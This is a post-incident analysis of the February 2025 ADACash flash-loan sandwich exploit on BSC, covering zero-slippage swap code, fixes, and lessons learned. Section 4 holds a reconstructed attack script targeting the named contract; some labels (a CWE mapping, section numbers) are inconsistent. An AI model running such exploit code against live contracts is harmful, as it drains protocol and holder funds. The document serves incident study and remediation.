# ADACash — Lack of Slippage Protection Analysis

| Item | Details |
|------|---------|
| **Date** | 2025-02-07 |
| **Protocol** | ADACash (Cashverse) |
| **Chain** | BSC (BNB Smart Chain) |
| **Loss** | ~$107,000 |
| **Attacker** | [View on BSCScan](https://bscscan.com/address/) |
| **Attack Contract** | [View on BSCScan](https://bscscan.com/address/) |
| **Attack Tx** | [0x8501a9d3...e01a](https://bscscan.com/tx/0x8501a9d34fc28bee21b78c0fd53aafe58c80bc18fb0e2aaa55f69e1dfbd3e01a) |
| **Vulnerable Contract** | [0x651a89fe...94c48](https://bscscan.com/address/0x651a89fed302227d41425235f8e934502fb94c48) (ADAcash token contract, BSCScan verified) |
| **Root Cause** | Zero slippage protection due to hardcoded `amountOutMin = 0` in the token's internal swap functions (`swapTokensForEth`, `swapTokensForADA`, `addLiquidity`) — exposed to flash loan-based sandwich attacks |
| **PoC Source** | DeFiHackLabs (no official PoC for 2025-02, analysis based on on-chain incident data) |

---

## 1. Vulnerability Overview

ADACash (ticker: ADACASH) is a BEP-20-based Cardano (ADA) reward token protocol operating on the BSC chain. As the core token of the Cashverse ecosystem, it is designed so that holders automatically receive ADA rewards. The token contract (0x651a89fed302227d41425235f8e934502fb94c48) automatically triggers `swapAndLiquify()` inside `_transfer()` when the accumulated token balance in the contract exceeds a threshold, executing multiple swap functions through the PancakeSwap router in the process.

### Core Vulnerability

All three major swap-related functions in the ADACash contract hardcode the `amountOutMin` parameter to **0**:

- `swapTokensForEth()`: `0` when swapping ADACASH → BNB ("accept any amount of ETH")
- `swapTokensForADA()`: `0` when swapping ADACASH → ADA
- `addLiquidity()`: Both token and ETH minimums set to `0` when adding liquidity ("slippage is unavoidable")

This design is equivalent to instructing the AMM (Automated Market Maker) to "execute the swap regardless of the output amount." An attacker can manipulate the pool price using a flash loan and then trigger `swapAndLiquify()`, or sandwich-attack a state already awaiting a trigger, draining protocol funds.

The attack on February 7, 2025 resulted in approximately $107,000 in losses, believed to have been completed in a single transaction. Precedents on BSC with the same vulnerability type include BEARNDAO (December 2023, $769,000), EGA Token (October 2024, $554,000), and DCFToken (November 2024).

---

## 2. Vulnerable Code Analysis

### 2.1 `swapTokensForEth()` — Missing Slippage Validation (Core Vulnerability 1)

**Vulnerable Code (❌) — BSCScan Verified Actual Code**:
```solidity
// ADAcash.sol — 0x651a89fed302227d41425235f8e934502fb94c48
// PancakeSwap V2 Router: 0x10ED43C718714eb63d5aA57B78B54704E256024E

function swapTokensForEth(uint256 tokenAmount) private {
    address[] memory path = new address[](2);
    path[0] = address(this);          // ADACASH token
    path[1] = uniswapV2Router.WETH(); // WBNB

    _approve(address(this), address(uniswapV2Router), tokenAmount);

    // ❌ Vulnerability: amountOutMin = 0 — "accept any amount of ETH"
    // If this function executes while the attacker has manipulated the ADACASH/WBNB pool price,
    // tokens are sold at an extremely unfavorable rate, draining protocol funds
    uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
        tokenAmount,
        0,                // ❌ amountOutMin = 0: no minimum output restriction
        path,
        address(this),
        block.timestamp
    );
}
```

**Safe Code (✅)**:
```solidity
// Fixed swapTokensForEth() — slippage protection via TWAP oracle

function swapTokensForEth(uint256 tokenAmount) private {
    address[] memory path = new address[](2);
    path[0] = address(this);
    path[1] = uniswapV2Router.WETH();

    _approve(address(this), address(uniswapV2Router), tokenAmount);

    // ✅ Calculate expected output via TWAP oracle and set maximum slippage cap
    // (or use Chainlink price feed)
    uint256[] memory amountsOut = uniswapV2Router.getAmountsOut(tokenAmount, path);
    uint256 expectedOut = amountsOut[amountsOut.length - 1];
    uint256 minAmountOut = expectedOut * 95 / 100; // ✅ Allow max 5% slippage

    uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
        tokenAmount,
        minAmountOut, // ✅ Slippage protection applied
        path,
        address(this),
        block.timestamp
    );
}
```

**Issue**: `amountOutMin = 0` causes the swap to execute regardless of the pool's liquidity state or price manipulation. If an attacker triggers this function after pumping the ADACASH price through large buys (or dumping it through large sells), the contract exchanges tokens at a severely unfavorable rate.

---

### 2.2 `swapTokensForADA()` — Missing Slippage on Multi-Hop Swap (Core Vulnerability 2)

**Vulnerable Code (❌) — BSCScan Verified Actual Code**:
```solidity
// ADAcash.sol — swapTokensForADA function

function swapTokensForADA(uint256 tokenAmount) private {
    // 3-step swap path: ADACASH → WBNB → ADA
    address[] memory path = new address[](3);
    path[0] = address(this);          // ADACASH
    path[1] = uniswapV2Router.WETH(); // WBNB (intermediate token)
    path[2] = ADA;                    // Cardano (ADA) BEP-20

    _approve(address(this), address(uniswapV2Router), tokenAmount);

    // ❌ Vulnerability: amountOutMin = 0 even for a 3-hop swap
    // Slippage compounds across each hop (ADACASH→WBNB, WBNB→ADA),
    // yet there is no minimum output protection — vulnerable to dual-pool price manipulation
    uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        tokenAmount,
        0,             // ❌ amountOutMin = 0: unprotected even on multi-hop swap
        path,
        address(this),
        block.timestamp
    );
}
```

**Safe Code (✅)**:
```solidity
// ✅ Fixed swapTokensForADA() — multi-hop slippage protection

function swapTokensForADA(uint256 tokenAmount) private {
    address[] memory path = new address[](3);
    path[0] = address(this);
    path[1] = uniswapV2Router.WETH();
    path[2] = ADA;

    _approve(address(this), address(uniswapV2Router), tokenAmount);

    // ✅ Calculate expected output for each hop and set minimum receive amount
    uint256[] memory amountsOut = uniswapV2Router.getAmountsOut(tokenAmount, path);
    uint256 expectedADA = amountsOut[2]; // Expected final ADA received
    uint256 minADA = expectedADA * 95 / 100; // Allow max 5% slippage

    uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        tokenAmount,
        minADA,        // ✅ Set minimum ADA receive amount
        path,
        address(this),
        block.timestamp
    );
}
```

**Issue**: Multi-hop swaps compound slippage cumulatively at each leg of the route. Both the ADACASH→WBNB and WBNB→ADA legs can be price-manipulated independently, yet with a total path `amountOutMin` of `0`, even extreme losses result in a successful transaction.

---

### 2.3 `addLiquidity()` — Missing Slippage on Liquidity Addition (Vulnerability 3)

**Vulnerable Code (❌) — BSCScan Verified Actual Code**:
```solidity
// ADAcash.sol — addLiquidity function

function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
    _approve(address(this), address(uniswapV2Router), tokenAmount);

    // ❌ Vulnerability: both token and ETH minimums set to 0 when adding liquidity
    // Contract's own comment: "slippage is unavoidable"
    // — This is a design decision that sacrifices slippage protection for convenience,
    //   giving attackers an opportunity to manipulate prices at the time of liquidity addition
    uniswapV2Router.addLiquidityETH{value: ethAmount}(
        address(this),
        tokenAmount,
        0,             // ❌ amountTokenMin = 0: "slippage is unavoidable"
        0,             // ❌ amountETHMin = 0: "slippage is unavoidable"
        address(0),    // LP token burn address (dead address)
        block.timestamp
    );
}
```

**Safe Code (✅)**:
```solidity
// ✅ Fixed addLiquidity() — minimum amount protection applied

function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
    _approve(address(this), address(uniswapV2Router), tokenAmount);

    // ✅ Calculate expected minimums based on current pool ratio
    uint256 minTokenAmount = tokenAmount * 95 / 100; // Max 5% slippage
    uint256 minEthAmount = ethAmount * 95 / 100;     // Max 5% slippage

    uniswapV2Router.addLiquidityETH{value: ethAmount}(
        address(this),
        tokenAmount,
        minTokenAmount, // ✅ Specify minimum token quantity
        minEthAmount,   // ✅ Specify minimum ETH quantity
        address(0),
        block.timestamp
    );
}
```

**Issue**: Setting `amountTokenMin = 0, amountETHMin = 0` during liquidity addition allows an attacker to manipulate the price ratio so that when the contract adds liquidity, LP tokens are minted at an unfavorable ratio, diluting the contract's asset value.

---

### 2.4 `swapAndLiquify()` — Compound Vulnerability via Automatic Trigger

**Vulnerable Code (❌)**:
```solidity
// ADAcash.sol — swapAndLiquify: automatically called from _transfer()

bool inSwapAndLiquify; // reentrancy guard flag

modifier lockTheSwap {
    inSwapAndLiquify = true;
    _;
    inSwapAndLiquify = false;
}

function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
    // Split token balance into halves
    uint256 half = contractTokenBalance / 2;
    uint256 otherHalf = contractTokenBalance - half;

    uint256 initialBalance = address(this).balance;

    // ❌ Step 1: ADACASH → BNB (no slippage protection)
    swapTokensForEth(half);

    uint256 newBalance = address(this).balance - initialBalance;

    // ❌ Step 2: Add liquidity with half BNB + remaining ADACASH (no slippage protection)
    addLiquidity(otherHalf, newBalance);

    emit SwapAndLiquify(half, newBalance, otherHalf);
}
```

**Issue**: `swapAndLiquify()` is automatically called inside `_transfer()` when the condition `contractTokenBalance >= numTokensSellToAddToLiquidity` is met. This means this swap can be triggered even during an **ordinary token transfer transaction**. An attacker can predict this timing and execute a sandwich attack.

---

## 3. Attack Flow

### 3.1 Preparation Phase

1. The attacker monitors whether the ADACash contract is approaching the `swapAndLiquify` threshold.
2. The attacker identifies that the contract's ADACASH balance has accumulated above `numTokensSellToAddToLiquidity` (2B ADACASH), meaning the next transfer will trigger `swapAndLiquify()`.
3. The attacker prepares the attack using a flash loan or pre-held capital on PancakeSwap.

### 3.2 Execution Phase

1. **Flash Loan Initiation**: Borrow a large WBNB flash loan from the PancakeSwap WBNB pair
2. **ADACASH Price Manipulation**: Use borrowed WBNB to buy ADACASH in bulk → distort the ADACASH/WBNB pool price
3. **Trigger swapAndLiquify**: Attacker executes a small ADACASH transfer transaction to push the balance over the threshold → `swapAndLiquify()` automatically called
4. **Vulnerable Swap Executes**: Contract executes ADACASH → BNB swap with `amountOutMin = 0` → receives minimal BNB at the manipulated price
5. **Price Restoration & Profit Taking**: Attacker sells pre-purchased ADACASH as the price recovers to realize profit
6. **Flash Loan Repayment**: Repay flash loan principal + fee from profits
7. **Profit Secured**: Net profit ~$107,000 transferred to attacker's wallet

### 3.3 Attack Flow Diagram

```
┌──────────────────────────────────────────┐
│           Attacker (EOA)                  │
│      Deploy & Execute Attack Contract     │
└────────────────────┬─────────────────────┘
                     │ ① Flash loan request (WBNB)
                     ▼
┌──────────────────────────────────────────┐
│     PancakeSwap WBNB Pair (Flash Loan)    │
│   Borrow WBNB in bulk → pancakeCall()    │
└────────────────────┬─────────────────────┘
                     │ ② Receive large WBNB
                     ▼
┌──────────────────────────────────────────┐
│          pancakeCall() Execution Context  │
│                                          │
│  ③ Buy ADACASH in bulk with WBNB        │
│     (PancakeSwap Router)                 │
│     Artificially spike ADACASH price ↑  │
│     (or mass-sell ADACASH → crash ↓)    │
│                                          │
│  ④ Transfer small ADACASH to exceed     │
│     threshold → swapAndLiquify() auto-  │
│     triggered                           │
│                                          │
└────────────────────┬─────────────────────┘
                     │ ④ swapAndLiquify() called
                     ▼
┌──────────────────────────────────────────┐
│     ADACash Contract (Vulnerable)         │
│  0x651a89fed302227d41425235f8e934502fb94c48│
│                                          │
│  swapTokensForEth(half):                 │
│    ADACASH → BNB, amountOutMin = 0 ❌   │
│    Swap executes at manipulated price    │
│    → Contract receives minimal BNB      │
│    → Large-scale protocol fund loss     │
│                                          │
│  addLiquidity(otherHalf, newBalance):    │
│    amountTokenMin = 0 ❌                  │
│    amountETHMin = 0 ❌                    │
│    → LP minted at unfavorable ratio     │
└────────────────────┬─────────────────────┘
                     │ ⑤ Loss finalized (protocol funds drained)
                     ▼
┌──────────────────────────────────────────┐
│          pancakeCall() continues          │
│                                          │
│  ⑤ Sell pre-purchased ADACASH           │
│     (arbitrage: manipulated→restored)   │
│                                          │
│  ⑥ Convert profit WBNB → USDT/BUSD     │
│     (lock in profit)                    │
│                                          │
│  ⑦ Repay flash loan principal + fee     │
└────────────────────┬─────────────────────┘
                     │ ⑧ Net profit transferred to attacker wallet
                     ▼
            Attacker Net Profit: ~$107,000
```

### 3.4 Attack Outcome

- **Attacker Profit**: Approximately $107,000
- **Protocol Loss**: Large-scale loss of ADACASH assets and liquidity held in the ADACash contract
- **Attack Structure**: Completed in a single transaction (flash loan repaid within the same block)
- **Prerequisite**: ADACASH balance in the contract must be above the swap threshold

---

## 4. PoC Code Analysis

> Since no official PoC file for this incident exists in the DeFiHackLabs repository, the attack logic is reconstructed based on the same vulnerability type (missing slippage protection + auto `swapAndLiquify` trigger). The code below is an **educational reconstruction** referencing the BSCScan-verified contract source and similar incident PoCs (BEARNDAO, EGA Token).

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @KeyInfo (Educational Reconstruction)
// Total Lost : ~$107,000
// Chain      : BSC (BNB Smart Chain)
// Date       : 2025-02-07
// Attack Tx  : 0x8501a9d34fc28bee21b78c0fd53aafe58c80bc18fb0e2aaa55f69e1dfbd3e01a
// Vulnerable : 0x651a89fed302227d41425235f8e934502fb94c48 (ADACash token)
// Vulnerability: Lack of Slippage Protection (amountOutMin = 0)

import "forge-std/Test.sol";
import "../interface.sol";

interface IADACash is IERC20 {
    // Standard transfer to trigger auto-swap in ADACash token
    function transfer(address to, uint256 amount) external returns (bool);
}

contract ADACash_PoC is Test {
    // BSC core addresses
    IERC20 constant WBNB  = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 constant BUSD  = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IADACash constant ADACASH = IADACash(0x651a89fed302227d41425235f8e934502fb94c48);

    // PancakeSwap V2
    Uni_Pair_V2 constant WBNB_BUSD_PAIR =
        Uni_Pair_V2(0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16); // flash loan pool
    Uni_Pair_V2 constant ADACASH_WBNB_PAIR =
        Uni_Pair_V2(/* ADACASH/WBNB liquidity pool address */);
    Uni_Router_V2 constant ROUTER =
        Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    function setUp() public {
        // BSC fork: block just before the attack
        vm.createSelectFork("bsc", /* attack block number */);
    }

    function testExploit() public {
        console.log("=== ADACash Lack of Slippage Protection Attack PoC ===");
        console.log("WBNB balance before attack:", WBNB.balanceOf(address(this)));

        // ① Request flash loan from PancakeSwap WBNB/BUSD pool
        // pancakeCall() executes as callback
        WBNB_BUSD_PAIR.swap(
            500 ether, // 500 WBNB flash loan
            0,
            address(this),
            abi.encode("exploit") // flash loan trigger data
        );

        console.log("BUSD balance after attack:", BUSD.balanceOf(address(this)));
    }

    function pancakeCall(
        address /* sender */,
        uint256 amount0,
        uint256 /* amount1 */,
        bytes calldata /* data */
    ) external {
        // ② Buy ADACASH in bulk with flash-loaned WBNB
        // → Induce ADACASH price spike in ADACASH/WBNB pool
        WBNB.approve(address(ROUTER), type(uint256).max);
        ADACASH.approve(address(ROUTER), type(uint256).max);

        address[] memory buyPath = new address[](2);
        buyPath[0] = address(WBNB);
        buyPath[1] = address(ADACASH);

        // Buy ADACASH in bulk with flash loan WBNB (price manipulation)
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount0 * 8 / 10, // Use 80% for price manipulation
            0,
            buyPath,
            address(this),
            block.timestamp
        );

        // ③ Push ADACash contract past the swapAndLiquify threshold
        // When the contract's ADACASH balance exceeds the threshold (2B ADACASH),
        // swapAndLiquify() automatically executes on the next transfer()
        // → Swap executes with amountOutMin=0 at the manipulated price
        // (if already past threshold, a small transfer triggers it)
        uint256 triggerAmount = 1 * 1e9; // Trigger with small ADACASH transfer
        ADACASH.transfer(address(0xdead), triggerAmount);
        // ← At this point, the ADACash contract internally executes:
        //   1. swapTokensForEth(half): ADACASH → BNB, amountOutMin=0 ❌
        //   2. addLiquidity(otherHalf, bnb): amountTokenMin=0, amountETHMin=0 ❌
        //   processing the swap at the manipulated price
        //   → Contract assets exchanged at a fraction of their value

        // ④ Sell all held ADACASH back to WBNB (price restoration + profit)
        address[] memory sellPath = new address[](2);
        sellPath[0] = address(ADACASH);
        sellPath[1] = address(WBNB);

        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            ADACASH.balanceOf(address(this)),
            0,
            sellPath,
            address(this),
            block.timestamp
        );

        // ⑤ Convert profit WBNB → BUSD (lock in profit)
        address[] memory profitPath = new address[](2);
        profitPath[0] = address(WBNB);
        profitPath[1] = address(BUSD);

        uint256 wbnbBalance = WBNB.balanceOf(address(this));
        uint256 repayAmount = amount0 * 10025 / 10000; // flash loan repayment (0.25% fee)

        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            wbnbBalance - repayAmount,
            0,
            profitPath,
            address(this),
            block.timestamp
        );

        // ⑥ Repay flash loan WBNB
        WBNB.transfer(address(WBNB_BUSD_PAIR), repayAmount);

        console.log("Final BUSD profit:", BUSD.balanceOf(address(this)));
    }
}
```

---

## 5. CWE Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern | Similar Cases |
|----|--------------|----------|-----|-----------------|---------------|
| V-01 | Missing slippage protection — `swapTokensForEth` (`amountOutMin = 0`) | CRITICAL | CWE-20 (Improper Input Validation) | `06_frontrunning.md` | BEARNDAO (2023-12), EGA Token (2024-10) |
| V-02 | Missing slippage protection — `swapTokensForADA` multi-hop swap | CRITICAL | CWE-20 (Improper Input Validation) | `06_frontrunning.md` | DCFToken (2024-11) |
| V-03 | Missing slippage on liquidity addition — `addLiquidity` (`amountTokenMin = 0`) | HIGH | CWE-682 (Incorrect Calculation) | `07_token_integration.md` | BabyDogeCoin (2023-05) |
| V-04 | Predictability of auto-swap trigger | HIGH | CWE-691 (Insufficient Control Flow Management) | `02_flash_loan.md` | SafeMoon (2023-03) |
| V-05 | Reliance on AMM spot price — no TWAP | MEDIUM | CWE-330 (Use of Insufficiently Random Values) | `04_oracle_manipulation.md` | Pancake Bunny (2021-05) |

### V-01: Missing Slippage Protection (`swapTokensForEth`)

- **Description**: `swapExactTokensForETHSupportingFeeOnTransferTokens()` is called with `amountOutMin` hardcoded to `0`. This guarantees the swap completes no matter how unfavorable the pool price.
- **Impact**: If a swap is triggered immediately after an attacker manipulates the ADACASH price via a flash loan, the protocol exchanges its held ADACASH for an extremely small amount of BNB relative to market price, causing large-scale asset drain.
- **Attack Conditions**: (1) Contract ADACASH balance above threshold, (2) Attacker possesses sufficient capital to manipulate the pool (flash loans available).

### V-02: Missing Slippage Protection (`swapTokensForADA` multi-hop)

- **Description**: Final `amountOutMin = 0` even for a 3-step ADACASH→WBNB→ADA swap. Slippage compounds cumulatively across each hop, yet there is no minimum output validation.
- **Impact**: If an attacker simultaneously manipulates both the ADACASH/WBNB pool and the WBNB/ADA pool, the ADA purchase for reward distribution executes at an extremely unfavorable rate.
- **Attack Conditions**: At least one of the two pools has liquidity levels that can be manipulated via flash loan.

### V-03: Missing Slippage on Liquidity Addition (`addLiquidity`)

- **Description**: `addLiquidityETH()` is called with `amountTokenMin = 0, amountETHMin = 0`. The contract's own comment explicitly states "slippage is unavoidable," confirming this was an intentional design choice.
- **Impact**: Adding liquidity under price manipulation conditions causes LP tokens to be minted at an unfavorable ratio, resulting in the contract receiving less LP value than the assets it contributed. An attacker taking the opposing position can then realize a profit.
- **Attack Conditions**: Pool ratio manipulation at the timing of the second stage of `swapAndLiquify()` (liquidity addition).

### V-04: Predictability of Auto-Swap Trigger

- **Description**: `swapAndLiquify()` is automatically called inside `_transfer()` when `contractTokenBalance >= numTokensSellToAddToLiquidity` evaluates to true. This threshold and the current balance are both queryable on-chain by anyone, allowing attackers to predict the trigger timing precisely.
- **Impact**: The attacker can induce the trigger at a desired time (immediately after price manipulation), increasing the precision of the sandwich attack.
- **Attack Conditions**: On-chain state monitoring capability (standard MEV bot level).

### V-05: Reliance on AMM Spot Price

- **Description**: All swap functions rely solely on the AMM's instantaneous spot price, with no TWAP or external oracle (Chainlink). Flash loan-manipulated spot prices within a single block are used as-is.
- **Impact**: Using a TWAP oracle would have provided some insulation against momentary price distortions; the current design is fully exposed to intra-block price manipulation.
- **Attack Conditions**: Flash loan access.

---

## 6. Reproducibility Assessment

| Item | Assessment | Notes |
|------|-----------|-------|
| Technical Complexity | Low | Standard flash loan sandwich attack pattern |
| Required Capital | Medium | Zero-capital attack possible via flash loan |
| On-chain Public Information | High | Contract source code fully verified on BSCScan |
| Required Prior Knowledge | Low | Basic knowledge of PancakeSwap swaps + flash loans |
| Reproduction Difficulty | Low | Similar PoCs exist (BEARNDAO, EGA Token) |
| Re-attack Possibility After Patch | Low (if patched) | Defensible by fixing `amountOutMin` |

**Overall Risk Assessment**: **CRITICAL**

Reproducibility is very high given that the vulnerable code (BSCScan-verified) and reference PoCs with the same pattern are publicly available. Since the contract has no upgrade mechanism (no proxy pattern), the existing contract remains permanently vulnerable. There is also a risk that newly deployed token contracts following the same pattern will repeat this vulnerability.

---

## 7. Remediation

### Immediate Actions

**① `swapTokensForEth()` — Fix Slippage Parameter**

```solidity
// Before (vulnerable)
function swapTokensForEth(uint256 tokenAmount) private {
    // ...
    uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
        tokenAmount,
        0,              // ❌
        path,
        address(this),
        block.timestamp
    );
}

// After (safe) — getAmountsOut-based slippage protection
function swapTokensForEth(uint256 tokenAmount) private {
    address[] memory path = new address[](2);
    path[0] = address(this);
    path[1] = uniswapV2Router.WETH();

    _approve(address(this), address(uniswapV2Router), tokenAmount);

    uint256[] memory amountsOut = uniswapV2Router.getAmountsOut(tokenAmount, path);
    // ✅ Allow max 5% slippage (adjust to protocol specifics)
    uint256 minAmountOut = amountsOut[amountsOut.length - 1] * 95 / 100;

    uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
        tokenAmount,
        minAmountOut,   // ✅ Slippage protection applied
        path,
        address(this),
        block.timestamp
    );
}
```

**② `swapTokensForADA()` — Multi-Hop Slippage Protection**

```solidity
function swapTokensForADA(uint256 tokenAmount) private {
    address[] memory path = new address[](3);
    path[0] = address(this);
    path[1] = uniswapV2Router.WETH();
    path[2] = ADA;

    _approve(address(this), address(uniswapV2Router), tokenAmount);

    uint256[] memory amountsOut = uniswapV2Router.getAmountsOut(tokenAmount, path);
    uint256 minADA = amountsOut[2] * 95 / 100; // ✅ Minimum final ADA output

    uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        tokenAmount,
        minADA,         // ✅ Slippage protection
        path,
        address(this),
        block.timestamp
    );
}
```

**③ `addLiquidity()` — Set Minimum Amounts for Liquidity Addition**

```solidity
function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
    _approve(address(this), address(uniswapV2Router), tokenAmount);

    // ✅ Guarantee at least 95% of expected output based on current pool ratio
    uniswapV2Router.addLiquidityETH{value: ethAmount}(
        address(this),
        tokenAmount,
        tokenAmount * 95 / 100, // ✅ amountTokenMin
        ethAmount * 95 / 100,   // ✅ amountETHMin
        address(0),
        block.timestamp
    );
}
```

### Long-Term Improvements

| Vulnerability | Recommended Action |
|--------------|-------------------|
| Spot price reliance | Introduce TWAP oracle (using Uniswap V2 OracleLibrary) or reference Chainlink price feed |
| Auto-swap timing exposure | Add block delay or randomness to `swapAndLiquify` execution condition, or change to keeper-only manual invocation |
| Single AMM dependency | Reference multiple price sources with TWAP weighting |
| Non-upgradeable contract | Adopt proxy pattern (EIP-1967) to enable future security patches |
| Lack of monitoring | Build on-chain anomalous transaction detection system (monitor for large price movements + `swapAndLiquify` trigger patterns) |
| No audit or insufficient audit | Mandate pre-deployment vulnerability review by professional auditors — `amountOutMin = 0` code patterns should be treated as immediate RED FLAGs |

---

## 8. Lessons Learned

1. **`amountOutMin = 0` is absolutely unacceptable in production code**: Using `amountOutMin = 0` for convenience or under the reasoning that "slippage is unavoidable" exposes the protocol's entire treasury as an attack surface. The "slippage is unavoidable" comment demonstrates that the developers recognized this issue and ignored it — a clear security failure at the design stage.

2. **Auto-triggered swap functions are particularly dangerous**: The pattern of automatically triggering swaps inside `_transfer()` (`swapAndLiquify`) gives attackers control over the trigger timing. Any auto-swap mechanism must be accompanied by robust slippage protection.

3. **Recurring vulnerability in BSC reward token designs**: BSC-based auto-reward tokens — ADACash, BEARNDAO, EGA Token, DCFToken, BabyDogeCoin, and others — are repeatedly attacked via the same `amountOutMin = 0` vulnerability. When writing or auditing token contracts following this pattern (PancakeSwap auto-swap + reward distribution), slippage settings must be the top priority review item.

4. **AMM spot price reliance → flash loan attack vector**: Swap logic that relies solely on a single AMM's instantaneous price is always vulnerable to flash loan sandwich attacks. When internal operational functions execute swaps, a TWAP oracle or external trusted price feed must be used.

5. **Contract immutability risk**: When a critical vulnerability is discovered in a non-upgradeable contract, security patches are impossible. Protocols targeting long-term operation should adopt a proxy pattern to enable rapid response in security emergencies.

6. **Audits are mandatory before deployment**: The presence of `amountOutMin = 0` code with explanatory comments in the BSCScan-verified source code suggests deployment without a professional audit. Many similar small-scale BSC token projects skip pre-deployment audits, meaning the ~$107,000 loss was entirely preventable.

---

## 9. On-Chain Verification

### 8.1 PoC vs On-Chain Amount Comparison

| Item | Analysis Estimate | Reference Data | Notes |
|------|------------------|---------------|-------|
| Total Loss | ~$107,000 | ~$107,000 | Matches publicly reported loss |
| Attack Chain | BSC | BSC | BNB Smart Chain |
| Attack Date | 2025-02-07 | 2025-02-07 | Matches incident date |
| Profit Token | WBNB/BUSD/USDT | To be confirmed | Recommend verifying via BscScan TX |
| Flash Loan Source | PancakeSwap | To be confirmed | Refer to BscScan TX logs |

### 8.2 On-Chain Event Log Sequence (Estimated)

```
1. FlashSwap or flash loan initiation event
2. Transfer(WBNB → attacker, large amount) — flash loan received
3. Transfer(attacker → ADACASH/WBNB pool, WBNB) — price manipulation buy
4. Transfer(ADACASH/WBNB pool → attacker, ADACASH) — large ADACASH received
5. Transfer(attacker → ADACASH contract or dead) — swapAndLiquify trigger
   ↳ Internal Transfer(ADACASH contract → WBNB/BNB) — amountOutMin=0 swap
   ↳ Sync event (pool state change)
6. Transfer(attacker ADACASH → ADACASH/WBNB pool) — price restoration sell
7. Transfer(WBNB → BUSD) — profit locked
8. Transfer(WBNB → flash loan pool) — flash loan repaid
```

### 8.3 Precondition Verification

- **Threshold reached**: ADACASH held in the contract must exceed `numTokensSellToAddToLiquidity = 2_000_000_000 * 1e9` (2B ADACASH × 10^9)
- **Swap lock state**: `inSwapAndLiquify = false` required for auto-swap to execute
- **Contract BNB balance**: Minimum BNB balance required for liquidity addition
- **Flash loan access**: Sufficient liquidity in PancakeSwap WBNB pair for flash loan

> **On-chain verification not performed**: Direct on-chain queries were not executed due to unconfigured `cast` environment. It is recommended to directly query the attack TX (`0x8501a9d34fc28bee21b78c0fd53aafe58c80bc18fb0e2aaa55f69e1dfbd3e01a`) on BscScan or Phalcon Explorer to verify amounts and event logs.

---

## References and Similar Incidents

| Incident | Date | Loss | Chain | Common Factor |
|---------|------|------|-------|--------------|
| BEARNDAO | 2023-12-05 | ~$769,000 | BSC | `convertDustToEarned()` amountOutMin=0, flash loan |
| BabyDogeCoin | 2023-05-28 | ~$118,000 | BSC | swapAndLiquify amountOutMin=0 |
| EGA Token | 2024-10-05 | ~$554,000 | BSC | buyEGA() amountOutMin=0, flash loan |
| DCFToken | 2024-11-24 | Undisclosed | BSC | Missing slippage protection, BSC token |
| TheStandard | 2023-11-06 | ~$260,000 | ARB | Slippage parameter 0, auto-swap |
| Inferno | 2024-09-11 | Undisclosed | ETH | Missing slippage protection |
| ZeUSD | 2025-03-01 | Undisclosed | ETH | Missing slippage protection |

- [ADACash Token Contract (BSCScan)](https://bscscan.com/address/0x651a89fed302227d41425235f8e934502fb94c48#code)
- [Cashverse Official Site](https://cashverse.io/)
- [ADACash Staking Documentation](https://cashverse.gitbook.io/adacash/staking/adacash-staking)
- [ImmuneBytes — What Are Slippage Attacks in DEXs?](https://immunebytes.com/blog/what-are-slippage-attacks-in-decentralized-exchanges-dexs/)
- [Smart Contract Security Field Guide — Unprotected Swaps](https://scsfg.io/hackers/unprotected-swaps/)
- [BEARNDAO Lack of Slippage Protection Analysis (Similar Case)](../2023-12-05_BEARNDAO_SlippageProtection_BSC.md)
- [EGA Token Lack of Slippage Protection Analysis (Similar Case)](../2024-10-05_EGAToken_SlippageProtection_BSC.md)

---

*Document created: 2026-04-11 | Analysis based on: BSCScan-verified contract source code, similar incident PoCs, public incident data*